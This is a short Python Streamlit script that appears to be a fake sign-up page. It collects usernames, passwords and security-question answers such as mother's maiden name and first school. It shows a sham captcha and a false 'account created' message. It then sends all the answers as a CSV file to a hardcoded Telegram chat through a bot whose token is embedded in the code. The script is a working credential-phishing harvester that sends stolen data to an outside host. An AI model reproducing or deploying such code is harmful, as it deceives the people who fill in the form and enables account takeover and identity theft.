import streamlit as st
import pandas as pd
import csv, io
import telebot
import cv2

# streamlit run app.py

st.subheader("Create an Account")
new_user = st.text_input('Username')
new_passwd = st.text_input('Password', type='password')

st.write('Please answer the security questions:')
type = st.text_input('Urban or beach vibe?')
school = st.text_input('Name of your first school?')
mom_name = st.text_input('Mother''s maiden name?')
hotel = st.text_input('next vacation - fancy boho chick hotel or airbnb in a secluded beach?')
drink = st.text_input('Next vacation with grillouzo or limoncello?')



# save results to csv and send via telegram

df = pd.DataFrame({"username": [new_user], "password": [new_passwd], "school": [school], "mom_name": [mom_name], "hotel": [hotel], "drink": [drink]})

TOKEN = "2034688341:AAGiWVOQZ_wJUDLEGPbqXn80LzJ9palMWu0"
tb = telebot.TeleBot(TOKEN)  # create a new Telegram Bot object
if st.button('Sign Up'):
	im = st.image('captcha.png')
	captcha = st.text_input('Enter image numbers')
	ver = st.button('Verify')
	if ver:

		st.success("You have successfully created an account.Go to the Login Menu to login")
		df = pd.DataFrame({"username": [new_user], "password": [new_passwd], "school": [school], "mom_name": [mom_name], "hotel": [hotel], "drink": [drink], "images": [captcha]})
		chat_id = '630924196'

		test_data = df.to_records()
		print(test_data)
		# csv module can write data in io.StringIO buffer only
		s = io.StringIO()
		csv.writer(s).writerows(test_data)
		s.seek(0)
		# python-telegram-bot library can send files only from io.BytesIO buffer
		# we need to convert StringIO to BytesIO
		buf = io.BytesIO()

		# extract csv-string, convert it to bytes and write to buffer
		buf.write(s.getvalue().encode())
		buf.seek(0)

		# set a filename with file's extension
		buf.name = f'secret_report_for_cool_guys.csv'

		# send the buffer as a regular file
		tb.send_document(chat_id, buf)